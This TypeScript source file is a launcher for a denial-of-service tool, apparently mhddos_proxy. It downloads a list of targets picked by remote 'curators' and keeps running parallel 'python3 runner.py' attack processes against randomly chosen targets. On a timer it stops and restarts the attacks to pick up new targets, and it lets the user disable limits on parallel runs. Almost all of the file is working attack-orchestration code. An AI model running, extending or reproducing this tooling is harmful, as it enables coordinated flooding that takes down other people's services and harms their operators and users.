import { $, argv, cd, chalk, fetch, nothrow, ProcessOutput, question, quiet } from 'zx';
import { ACTIVE_NON_UDP_TARGETS_REGEX, ACTIVE_UDP_TARGETS_REGEX, TARGETS_URL } from './constants';
import { parseArguments } from './parse-arguments';
import { parseRestartInterval } from './parse-restart-interval';
import { clamp } from './utils/clamp';
import { parseFlags } from './utils/parse-flags';

$.verbose = false;

const { parallel, disableParallelLimit, restartInterval, debug, t, ...mhddosArgs } = parseArguments(argv);

if (disableParallelLimit) {
  console.log(
    chalk.redBright.bold(
      'WARNING: Disabling parallel limits can lead to unexpected results. Your system may become unresponsive or get damaged. Use at your own risk.',
    ),
  );

  const shouldContinue = (await question('Continue? (y/N) ')) === 'y';

  if (!shouldContinue) {
    console.log(chalk('Aborted.'));

    process.exit();
  }
}

const mhddosFlags = parseFlags(mhddosArgs);

// ===== RUN

await startAttack();

const intervalId = setInterval(async () => {
  await stopAttack();
  await startAttack();
}, parseRestartInterval(restartInterval));

// properly handling Ctrl+C
process.on('SIGINT', function () {
  clearInterval(intervalId);
  process.exit();
});

// ===== FUNCTIONS

async function startAttack(): Promise<void> {
  const targets = await getRandomTargets();
  const flags = [debug ? '--debug' : undefined, `-t=${Math.floor(t / targets.length)}`, ...mhddosFlags];

  if (targets.length) {
    console.log(chalk('\nStarting attacks...'));

    cd('/mhddos_proxy');

    {
      $.verbose = true;

      Promise.allSettled(
        targets.map(async (target) =>
          $`python3 runner.py ${target.split(' ')} ${flags.filter(Boolean)}`.catch((e: ProcessOutput) => {
            if (e.signal !== 'SIGTERM') {
              process.exit(e.exitCode ?? 1);
            }
          }),
        ),
      );

      $.verbose = false;
    }
  } else {
    console.log(chalk('There are currently no active targets. Waiting for updates from curators...'));
  }
}

async function stopAttack(): Promise<void> {
  await quiet(nothrow($`pkill python3`));

  console.log(chalk(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`));
}

async function getRandomTargets(): Promise<string[]> {
  const targets = await getTargetList();
  const parallel = computeParallel(targets);
  const randomTargets: string[] = [];

  while (randomTargets.length < parallel) {
    const randomTarget = targets[Math.floor(Math.random() * targets.length)];

    if (!randomTargets.includes(randomTarget) || randomTargets.length >= targets.length) {
      randomTargets.push(randomTarget);
    }
  }

  return randomTargets;
}

async function getTargetList(): Promise<string[]> {
  console.log(chalk('Getting targets...'));

  const response = await fetch(TARGETS_URL);

  if (!response.ok) {
    console.log(chalk.redBright('Failed to get targets.'));

    return [];
  }

  const fileContent = await (response.ok ? response.text() : Promise.resolve(''));

  // show warning if there are active UDP targets
  if (ACTIVE_UDP_TARGETS_REGEX.test(fileContent)) {
    console.log(chalk.yellowBright('There are UDP targets that are not supported by this tool. They were ignored.'));
  }

  // getting all active non-UDP targets
  const rawTargets = fileContent.match(ACTIVE_NON_UDP_TARGETS_REGEX) || [];
  // cleaning out all extra stuff
  const targets = rawTargets.map((target) => target.replace('runner.py ', '').trim());

  return [...new Set(targets)];
}

function computeParallel(targets: string[]): number {
  if (parallel === 'all') {
    return targets.length;
  }

  return clamp(parallel, 1, disableParallelLimit ? parallel : targets.length);
}
